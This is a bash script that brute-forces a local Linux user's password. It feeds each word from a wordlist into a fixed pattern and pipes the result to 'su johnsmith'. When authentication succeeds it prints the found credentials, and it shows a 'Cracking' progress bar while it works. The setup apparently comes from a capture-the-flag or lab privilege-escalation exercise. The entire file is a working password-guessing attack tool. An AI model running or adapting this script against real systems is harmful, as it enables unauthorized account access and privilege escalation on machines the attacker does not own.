#!/bin/bash

set -m #enable job control
export TOP_PID=$$ #get the current PID
trap "trap - SIGTERM && kill -- -$$" INT SIGINT SIGTERM EXIT #exit on trap

# https://github.com/fearside/ProgressBar/blob/master/progressbar.sh
# something to look at while waiting
function progressbar {
        let _progress=(${1}*100/${2}*100)/100
        let _done=(${_progress}*4)/10
        let _left=40-$_done

        _done=$(printf "%${_done}s")
        _left=$(printf "%${_left}s")

        printf "\rCracking : [${_done// /#}${_left// /-}] ${_progress}%%"
}

function brute() {
        keyword=$1 #get the word
        password="PrettyS3cure${keyword}Password123." #add it to our format
        output=$( ( sleep 0.2s && echo $password ) | script -qc 'su johnsmith -c "id"' /dev/null) # check the password
        if [[ $output != *"Authentication failure"* ]]; then #if password was correct
                printf "\rCreds Found! johnsmith:$password\n$output\nbye..." #print the password
                kill -9 -$(ps -o pgid= $TOP_PID  | grep -o '[0-9]*') #kill parent and other jobs
        fi
}

wordlist=$1 #get wordlist as parameter

count=$(wc -l $wordlist| grep -o '[0-9]*') #count how many words we have
current=1

while IFS= read -r line #for each line
do
        brute $line & #try the password
        progressbar ${current} ${count} #update progress bar. TODO:calculate ETA
        current=$(( current + 1 )) #increment
done < $wordlist #read the wordlist

wait #wait for active jobs